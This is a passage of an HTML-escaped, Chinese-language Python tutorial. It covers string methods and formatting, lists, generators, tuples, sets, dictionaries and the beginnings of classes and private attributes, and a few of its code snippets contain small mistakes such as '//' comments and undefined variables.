&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;使用&lt;code&gt;+&lt;/code&gt;进行字符串拼接，使用&lt;code&gt;*&lt;/code&gt;重复一个字符串的内容，&lt;code&gt;in&lt;/code&gt;、&lt;code&gt;not in&lt;/code&gt;来判断字符串中是否包含子串，&lt;code&gt;[]&lt;/code&gt;、&lt;code&gt;[:]&lt;/code&gt;用来切片运算。&lt;/p&gt;
&lt;p&gt;字符串类型是一种结构化的、非标量类型，所以会有一系列的属性和方法。
字符串对象身上的&lt;strong&gt;常用的函数&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;len()；获取字符串长度&lt;/li&gt;
&lt;li&gt;capitalize()；字符串首个字母大写的拷贝&lt;/li&gt;
&lt;li&gt;title()；每个字符串单词首字母大写的拷贝&lt;/li&gt;
&lt;li&gt;upper()；所有字符串大写的拷贝&lt;/li&gt;
&lt;li&gt;find()；查找字串位置。未找到值为 -1&lt;/li&gt;
&lt;li&gt;startswith()；以某字符开始。类似的有endswith()&lt;/li&gt;
&lt;li&gt;center(50,&amp;rsquo;*&amp;rsquo;)；将字符串以指定宽度居中，填充指定字符。类似的有rjust()、ljust()&lt;/li&gt;
&lt;li&gt;isdigit()；是否为数字构成&lt;/li&gt;
&lt;li&gt;isalpha()；是否为字母构成&lt;/li&gt;
&lt;li&gt;isalnum()；是否为数字字母构成&lt;/li&gt;
&lt;li&gt;strip()；获取处理左右两侧空格后的拷贝&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;格式化输出字符串&lt;/strong&gt;
使用&lt;code&gt;%d&lt;/code&gt;、&lt;code&gt;%s&lt;/code&gt;等占位符，并在字符串结尾使用&lt;code&gt;%()&lt;/code&gt;列表对应。
字符串提供的&lt;code&gt;format()&lt;/code&gt;方法。
Python 3.6以后提供了语法糖表示，在字符串前使用&lt;code&gt;f&lt;/code&gt;。&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-python" data-lang="python"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;a,b &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;5&lt;/span&gt;,&lt;span style="color:#ae81ff"&gt;10&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;print(&lt;span style="color:#e6db74"&gt;&amp;#39;&lt;/span&gt;&lt;span style="color:#e6db74"&gt;%d&lt;/span&gt;&lt;span style="color:#e6db74"&gt; * &lt;/span&gt;&lt;span style="color:#e6db74"&gt;%d&lt;/span&gt;&lt;span style="color:#e6db74"&gt; = &lt;/span&gt;&lt;span style="color:#e6db74"&gt;%d&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#39;&lt;/span&gt; &lt;span style="color:#f92672"&gt;%&lt;/span&gt; (a, b, a &lt;span style="color:#f92672"&gt;*&lt;/span&gt; b))
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;print(&lt;span style="color:#e6db74"&gt;&amp;#39;&lt;/span&gt;&lt;span style="color:#e6db74"&gt;{0}&lt;/span&gt;&lt;span style="color:#e6db74"&gt; * &lt;/span&gt;&lt;span style="color:#e6db74"&gt;{1}&lt;/span&gt;&lt;span style="color:#e6db74"&gt; = &lt;/span&gt;&lt;span style="color:#e6db74"&gt;{2}&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#39;&lt;/span&gt;&lt;span style="color:#f92672"&gt;.&lt;/span&gt;format(a, b, a &lt;span style="color:#f92672"&gt;*&lt;/span&gt; b))
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;print(&lt;span style="color:#e6db74"&gt;f&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#39;&lt;/span&gt;&lt;span style="color:#e6db74"&gt;{&lt;/span&gt;a&lt;span style="color:#e6db74"&gt;}&lt;/span&gt;&lt;span style="color:#e6db74"&gt; * &lt;/span&gt;&lt;span style="color:#e6db74"&gt;{&lt;/span&gt;b&lt;span style="color:#e6db74"&gt;}&lt;/span&gt;&lt;span style="color:#e6db74"&gt; = &lt;/span&gt;&lt;span style="color:#e6db74"&gt;{&lt;/span&gt;a &lt;span style="color:#f92672"&gt;*&lt;/span&gt; b&lt;span style="color:#e6db74"&gt;}&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id="列表"&gt;列表
&lt;/h3&gt;&lt;p&gt;数值类型（int、float）是标量类型，列表（list）是一种结构化的、非标量类型。
可以使用下标的方式遍历列表元素，或者for循环遍历列表元素&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-python" data-lang="python"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;list &lt;span style="color:#f92672"&gt;=&lt;/span&gt; [&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;,&lt;span style="color:#ae81ff"&gt;2&lt;/span&gt;,&lt;span style="color:#ae81ff"&gt;3&lt;/span&gt;,&lt;span style="color:#ae81ff"&gt;4&lt;/span&gt;,&lt;span style="color:#ae81ff"&gt;5&lt;/span&gt;,&lt;span style="color:#ae81ff"&gt;6&lt;/span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;//&lt;/span&gt;通过下标访问
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;for&lt;/span&gt; index &lt;span style="color:#f92672"&gt;in&lt;/span&gt; range(len(list)):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; print(list[index])
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;//&lt;/span&gt;遍历元素访问
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;for&lt;/span&gt; elem &lt;span style="color:#f92672"&gt;in&lt;/span&gt; list:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; print(elem)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;//&lt;/span&gt;使用enumerate()处理获得元素及其下标
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;for&lt;/span&gt; index, elem &lt;span style="color:#f92672"&gt;in&lt;/span&gt; enumerate(list1):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; print(index, elem)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
&lt;p&gt;enumerate() 函数用于将一个可遍历的数据对象(如列表、元组或字符串)组合为一个索引序列，同时列出数据和数据下标，一般用在 for 循环当中。&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;列表也可以使用&lt;code&gt;+&lt;/code&gt;进行拼接，使用切片操作获得列表的复制。
&lt;code&gt;sorted()&lt;/code&gt;函数返回列表进行排序后的备份，不会影响原来的列表，我们设计函数应该像 sorted 函数一样不产生副作用。可以设置关键字&lt;code&gt;reverse=True&lt;/code&gt;使列表逆置，关键字&lt;code&gt;key=len&lt;/code&gt;根据字符串长度进行排序&lt;/p&gt;
&lt;h3 id="生成式和生成器"&gt;生成式和生成器
&lt;/h3&gt;&lt;p&gt;生成式表达式创建列表容器和生成器创建列表容器&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-python" data-lang="python"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;//&lt;/span&gt;用列表的生成表达式语法创建列表容器
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;//&lt;/span&gt;表达式生成的容器里面元素已经准备就绪&lt;span style="color:#960050;background-color:#1e0010"&gt;，&lt;/span&gt;所以会耗费较多内存空间
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;f1 &lt;span style="color:#f92672"&gt;=&lt;/span&gt; [x &lt;span style="color:#f92672"&gt;**&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;2&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;for&lt;/span&gt; x &lt;span style="color:#f92672"&gt;in&lt;/span&gt; range(&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;, &lt;span style="color:#ae81ff"&gt;1000&lt;/span&gt;)]
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;//&lt;/span&gt;下面的代码创建的不是一个列表而是一个生成器对象
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;//&lt;/span&gt;生成器会在使用时&lt;span style="color:#960050;background-color:#1e0010"&gt;，&lt;/span&gt;经过运算获取数据&lt;span style="color:#960050;background-color:#1e0010"&gt;，&lt;/span&gt;不占用额外空间&lt;span style="color:#960050;background-color:#1e0010"&gt;，&lt;/span&gt;但是消耗时间
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;f2 &lt;span style="color:#f92672"&gt;=&lt;/span&gt; (x &lt;span style="color:#f92672"&gt;**&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;2&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;for&lt;/span&gt; x &lt;span style="color:#f92672"&gt;in&lt;/span&gt; range(&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;, &lt;span style="color:#ae81ff"&gt;1000&lt;/span&gt;))
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;还可以使用关键字&lt;code&gt;yield&lt;/code&gt;将一个普通函数改造成&lt;strong&gt;生成器函数&lt;/strong&gt;，下面是使用生成器函数打印斐波那契数列的例子&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-python" data-lang="python"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;def&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;fib&lt;/span&gt;(n):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; a, b &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;, &lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;for&lt;/span&gt; _ &lt;span style="color:#f92672"&gt;in&lt;/span&gt; range(n):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; a, b &lt;span style="color:#f92672"&gt;=&lt;/span&gt; b, a &lt;span style="color:#f92672"&gt;+&lt;/span&gt; b
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;yield&lt;/span&gt; a
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;def&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;main&lt;/span&gt;():
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;for&lt;/span&gt; val &lt;span style="color:#f92672"&gt;in&lt;/span&gt; fib(&lt;span style="color:#ae81ff"&gt;20&lt;/span&gt;):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; print(val)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; __name__ &lt;span style="color:#f92672"&gt;==&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;__main__&amp;#39;&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; main()
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id="元组"&gt;元组
&lt;/h3&gt;&lt;p&gt;元组与列表类似也是一种容器数据类型，但是元素内的元素不可以被修改。
可以使用列表的方法访问元素，不能修改元组元素，但是可以引用新的元组，原来的元素就会被垃圾回收。
使用&lt;code&gt;list()&lt;/code&gt;函数将元组转换成列表，使用&lt;code&gt;tuple()&lt;/code&gt;函数将列表转换成元组。
为什么要用元组？&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;元组可以在多线程环境中保证对象状态不会被修改，一个不变对象自动就是线程安全的，这样就可以省掉处理同步化的开销。&lt;/li&gt;
&lt;li&gt;元组在创建时间和占用的空间上面都优于列表。&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id="集合"&gt;集合
&lt;/h3&gt;&lt;p&gt;集合跟数学上的集合是一致的，不允许有重复元素，而且可以进行交集、并集、差集等运算。
如果定义集合时有重复元素会被剔除；集合可以添加删除元素；
集合的成员进行交集（&amp;amp;）、并集、差集等运算。例&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-python" data-lang="python"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;set1 &lt;span style="color:#f92672"&gt;=&lt;/span&gt; {&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;, &lt;span style="color:#ae81ff"&gt;2&lt;/span&gt;, &lt;span style="color:#ae81ff"&gt;3&lt;/span&gt;, &lt;span style="color:#ae81ff"&gt;3&lt;/span&gt;, &lt;span style="color:#ae81ff"&gt;3&lt;/span&gt;, &lt;span style="color:#ae81ff"&gt;2&lt;/span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;# 集合的交集、并集、差集、对称差运算&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;print(set1 &lt;span style="color:#f92672"&gt;&amp;amp;&lt;/span&gt; set2)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;# print(set1.intersection(set2))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;print(set1 &lt;span style="color:#f92672"&gt;|&lt;/span&gt; set2)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;# print(set1.union(set2))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;print(set1 &lt;span style="color:#f92672"&gt;-&lt;/span&gt; set2)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;# print(set1.difference(set2))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;print(set1 &lt;span style="color:#f92672"&gt;^&lt;/span&gt; set2)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;# print(set1.symmetric_difference(set2))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;# 判断子集和超集&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;print(set2 &lt;span style="color:#f92672"&gt;&amp;lt;=&lt;/span&gt; set1)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;# print(set2.issubset(set1))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;print(set3 &lt;span style="color:#f92672"&gt;&amp;lt;=&lt;/span&gt; set1)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;# print(set3.issubset(set1))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;print(set1 &lt;span style="color:#f92672"&gt;&amp;gt;=&lt;/span&gt; set2)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;# print(set1.issuperset(set2))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;print(set1 &lt;span style="color:#f92672"&gt;&amp;gt;=&lt;/span&gt; set3)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;# print(set1.issuperset(set3))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id="字典"&gt;字典
&lt;/h3&gt;&lt;p&gt;字典可以存储任何数据类型，每一个元素都为一个键一个值的&lt;code&gt;key:value&lt;/code&gt;格式。&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-python" data-lang="python"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;dic1&lt;span style="color:#f92672"&gt;=&lt;/span&gt;{&lt;span style="color:#e6db74"&gt;&amp;#39;筑基丹&amp;#39;&lt;/span&gt;: &lt;span style="color:#ae81ff"&gt;1100&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;元灵精华&amp;#39;&lt;/span&gt;: &lt;span style="color:#ae81ff"&gt;900&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;磐龙宝剑&amp;#39;&lt;/span&gt;: &lt;span style="color:#ae81ff"&gt;11000&lt;/span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;# 创建字典的构造器语法&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;items1 &lt;span style="color:#f92672"&gt;=&lt;/span&gt; dict(one&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;, two&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;2&lt;/span&gt;, three&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;3&lt;/span&gt;, four&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;4&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;# 通过zip函数将两个序列压成字典&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;items2 &lt;span style="color:#f92672"&gt;=&lt;/span&gt; dict(zip([&lt;span style="color:#e6db74"&gt;&amp;#39;a&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;b&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;c&amp;#39;&lt;/span&gt;], &lt;span style="color:#e6db74"&gt;&amp;#39;123&amp;#39;&lt;/span&gt;))
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;# 对字典中所有键值对进行遍历&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;for&lt;/span&gt; key &lt;span style="color:#f92672"&gt;in&lt;/span&gt; dic1:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; print(&lt;span style="color:#e6db74"&gt;f&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#39;&lt;/span&gt;&lt;span style="color:#e6db74"&gt;{&lt;/span&gt;key&lt;span style="color:#e6db74"&gt;}&lt;/span&gt;&lt;span style="color:#e6db74"&gt;: &lt;/span&gt;&lt;span style="color:#e6db74"&gt;{&lt;/span&gt;dic1[key]&lt;span style="color:#e6db74"&gt;}&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;# get方法也是通过键获取对应的值但是可以设置默认值&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;print(scores&lt;span style="color:#f92672"&gt;.&lt;/span&gt;get(&lt;span style="color:#e6db74"&gt;&amp;#39;神农鼎&amp;#39;&lt;/span&gt;, &lt;span style="color:#ae81ff"&gt;60&lt;/span&gt;))
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id="面向对象编程"&gt;面向对象编程
&lt;/h2&gt;&lt;p&gt;比较正式的说法&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&amp;ldquo;把一组数据结构和处理它们的方法组成对象（object），把相同行为的对象归纳为类（class），通过类的封装（encapsulation）隐藏内部细节，通过继承（inheritance）实现类的特化（specialization）和泛化（generalization），通过多态（polymorphism）实现基于对象类型的动态分派。&amp;rdquo;&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;python中使用&lt;code&gt;class&lt;/code&gt;关键字定义类，然后在类中定义属性和方法&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-python" data-lang="python"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;class&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;Student&lt;/span&gt;(object):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#75715e"&gt;# __init__是一个特殊方法用于在创建对象时进行初始化操作&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#75715e"&gt;# 通过这个方法我们可以为学生对象绑定name和age两个属性&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;def&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;__init__&lt;/span&gt;(self, name, age):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; self&lt;span style="color:#f92672"&gt;.&lt;/span&gt;name &lt;span style="color:#f92672"&gt;=&lt;/span&gt; name
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; self&lt;span style="color:#f92672"&gt;.&lt;/span&gt;age &lt;span style="color:#f92672"&gt;=&lt;/span&gt; age
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;def&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;study&lt;/span&gt;(self, course_name):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; print(&lt;span style="color:#e6db74"&gt;&amp;#39;&lt;/span&gt;&lt;span style="color:#e6db74"&gt;%s&lt;/span&gt;&lt;span style="color:#e6db74"&gt;正在学习&lt;/span&gt;&lt;span style="color:#e6db74"&gt;%s&lt;/span&gt;&lt;span style="color:#e6db74"&gt;.&amp;#39;&lt;/span&gt; &lt;span style="color:#f92672"&gt;%&lt;/span&gt; (self&lt;span style="color:#f92672"&gt;.&lt;/span&gt;name, course_name))
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;def&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;main&lt;/span&gt;():
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; stu1 &lt;span style="color:#f92672"&gt;=&lt;/span&gt; Student(&lt;span style="color:#e6db74"&gt;&amp;#39;大卫&amp;#39;&lt;/span&gt;,&lt;span style="color:#ae81ff"&gt;18&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; stu1&lt;span style="color:#f92672"&gt;.&lt;/span&gt;study()
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;在python中可以给对象的属性或方法添加访问权限，就像Java中的私有属性，可以在属性或方法前添加双下划线&lt;code&gt;__&lt;/code&gt;表示改方法是私有的，并且调用对象的属性或方法时会报&lt;code&gt;'XXX' object has no attribute '__xx'&lt;/code&gt;的错误。
但是Python并没有从语法上保护属性或方法的私密性，如果知道更换名字的规则仍然可以访问到它们，如&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-Python" data-lang="Python"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;class&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;Test&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;def&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;__init__&lt;/span&gt;(self, foo):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; self&lt;span style="color:#f92672"&gt;.&lt;/span&gt;__foo &lt;span style="color:#f92672"&gt;=&lt;/span&gt; foo
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;def&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;__bar&lt;/span&gt;(self):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; print(self&lt;span style="color:#f92672"&gt;.&lt;/span&gt;__foo)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; print(&lt;span style="color:#e6db74"&gt;&amp;#39;__bar&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;def&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;main&lt;/span&gt;():
